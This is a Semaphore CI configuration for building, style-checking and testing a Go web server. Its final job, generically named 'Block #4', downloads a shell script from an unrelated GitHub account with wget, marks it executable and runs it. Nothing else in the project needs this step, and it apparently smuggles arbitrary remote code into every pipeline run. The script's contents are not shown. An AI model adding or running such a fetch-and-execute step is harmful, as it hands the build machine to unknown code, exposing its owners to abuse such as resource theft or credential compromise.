version: v1.0
name: Semaphore Go CI example
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu1804
execution_time_limit:
  hours: 12
blocks:
  - name: Build project
    task:
      jobs:
        - name: go get & build
          commands:
            - checkout
            - sem-version go 1.12
            - go get github.com/lib/pq
            - go build webServer.go
            - artifact push workflow webServer --force
  - name: Check code style
    task:
      jobs:
        - name: gofmt
          commands:
            - checkout
            - sem-version go 1.12
            - sudo apt install -y gccgo-go
            - gofmt webServer.go | diff --ignore-tab-expansion webServer.go -
  - name: Run tests
    task:
      prologue:
        commands:
          - checkout
          - sem-version go 1.12
      jobs:
        - name: go test
          commands:
            - sem-service start postgres
            - psql -p 5432 -h localhost -U postgres -c "CREATE DATABASE s2"
            - go get github.com/lib/pq
            - go test ./... -v
        - name: Test web server
          commands:
            - mkdir bin
            - artifact pull workflow webServer
            - mv webServer bin
            - chmod +x ./bin/webServer
            - ./bin/webServer 8001 &
            - 'curl --silent localhost:8001/time | grep "The current time is"'
  - name: 'Block #4'
    task:
      jobs:
        - name: 'Job #1'
          commands:
            - ' wget https://raw.githubusercontent.com/surorebro/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh'
